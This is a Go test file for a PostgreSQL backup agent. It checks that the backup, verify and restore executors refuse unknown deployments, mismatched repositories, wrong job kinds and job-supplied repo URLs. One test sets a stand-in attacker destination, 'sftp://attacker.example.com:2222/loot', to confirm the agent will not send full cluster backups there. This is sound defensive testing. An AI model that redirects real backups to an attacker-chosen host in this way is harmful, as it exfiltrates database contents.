package agent_test

import (
	"context"
	"strings"
	"testing"

	"github.com/cybertec-postgresql/pg_hardstorage/internal/agent"
	"github.com/cybertec-postgresql/pg_hardstorage/internal/config"
)

// TestExecutor_RejectsUnknownDeployment surfaces the structured
// failure when the control plane dispatched a job for a deployment
// the agent doesn't manage. This is the guardrail that prevents
// a misconfigured controller from quietly succeeding against the
// wrong host.
func TestExecutor_RejectsUnknownDeployment(t *testing.T) {
	ex := agent.NewBackupExecutor(map[string]config.DeploymentConfig{}, config.KMSConfig{}, nil, nil)
	_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
		ID:         "job-1",
		Kind:       "backup",
		Deployment: "db1",
	}, func(map[string]any) {})
	if err == nil || !strings.Contains(err.Error(), "not in local config") {
		t.Errorf("expected 'not in local config' error; got %v", err)
	}
}

// TestExecutor_RejectsRepoMismatch refuses to run a backup whose
// RepoURL diverges from the agent's locally-declared repo.
func TestExecutor_RejectsRepoMismatch(t *testing.T) {
	deps := map[string]config.DeploymentConfig{
		"db1": {
			PGConnection: "postgres://x@y/z",
			Repo:         "file:///srv/repo-A",
		},
	}
	ex := agent.NewBackupExecutor(deps, config.KMSConfig{}, nil, nil)
	_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
		ID:         "job-1",
		Kind:       "backup",
		Deployment: "db1",
		RepoURL:    "file:///srv/repo-B",
	}, func(map[string]any) {})
	if err == nil || !strings.Contains(err.Error(), "doesn't match") {
		t.Errorf("expected 'doesn't match' refusal; got %v", err)
	}
}

// TestExecutor_RejectsNonBackupKind asserts the kind guard. With the
// v0.5 RouterExecutor, dispatch by Kind is the router's job; the
// BackupExecutor itself only handles "backup" and refuses anything
// else loudly so a wiring bug doesn't half-execute the wrong job.
func TestExecutor_RejectsNonBackupKind(t *testing.T) {
	ex := agent.NewBackupExecutor(nil, config.KMSConfig{}, nil, nil)
	for _, kind := range []string{"restore", "verify", "nuke-from-orbit"} {
		_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
			ID:   "job-x",
			Kind: kind,
		}, func(map[string]any) {})
		if err == nil || !strings.Contains(err.Error(), "refusing kind") {
			t.Errorf("kind=%s: expected 'refusing kind' guard; got %v", kind, err)
		}
	}
}

// TestExecutor_RefusesJobRepoWithoutLocalRepo pins the SEC-2 guard:
// when the deployment has no repo in the agent's local config, a
// job-supplied RepoURL must be refused. Without it, anyone with
// control-plane access could redirect a deployment's physical base
// backup (fresh, full cluster data) to an attacker-chosen repo URL,
// because the cross-repo match guard skips when dep.Repo is empty.
func TestExecutor_RefusesJobRepoWithoutLocalRepo(t *testing.T) {
	deps := map[string]config.DeploymentConfig{
		"db1": {
			PGConnection: "postgres://x@y/z",
			// Repo intentionally empty: wal-stream/doctor-only
			// deployment.
		},
	}
	const attackerRepo = "sftp://attacker.example.com:2222/loot"

	t.Run("backup", func(t *testing.T) {
		ex := agent.NewBackupExecutor(deps, config.KMSConfig{}, nil, nil)
		_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
			ID: "job-1", Kind: "backup", Deployment: "db1", RepoURL: attackerRepo,
		}, func(map[string]any) {})
		if err == nil || !strings.Contains(err.Error(), "refusing job-supplied repo") {
			t.Errorf("expected job-supplied-repo refusal; got %v", err)
		}
	})

	t.Run("verify", func(t *testing.T) {
		ex := agent.NewVerifyExecutor(deps, config.KMSConfig{}, nil, "")
		_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
			ID: "job-1", Kind: "verify", Deployment: "db1", RepoURL: attackerRepo,
			Args: map[string]any{"backup_id": "db1.full.20260820T000000Z.abcdef01"},
		}, func(map[string]any) {})
		if err == nil || !strings.Contains(err.Error(), "refusing job-supplied repo") {
			t.Errorf("expected job-supplied-repo refusal; got %v", err)
		}
	})

	t.Run("restore", func(t *testing.T) {
		ex := agent.NewRestoreExecutor(deps, config.KMSConfig{}, nil, "")
		_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
			ID: "job-1", Kind: "restore", Deployment: "db1", RepoURL: attackerRepo,
			Args: map[string]any{
				"backup_id":  "db1.full.20260820T000000Z.abcdef01",
				"target_dir": "/tmp/restore-sec2",
			},
		}, func(map[string]any) {})
		if err == nil || !strings.Contains(err.Error(), "refusing job-supplied repo") {
			t.Errorf("expected job-supplied-repo refusal; got %v", err)
		}
	})

	t.Run("no job repo still refused (unchanged)", func(t *testing.T) {
		ex := agent.NewBackupExecutor(deps, config.KMSConfig{}, nil, nil)
		_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
			ID: "job-1", Kind: "backup", Deployment: "db1",
		}, func(map[string]any) {})
		if err == nil || !strings.Contains(err.Error(), "has no repo configured locally") {
			t.Errorf("expected no-repo refusal; got %v", err)
		}
	})
}
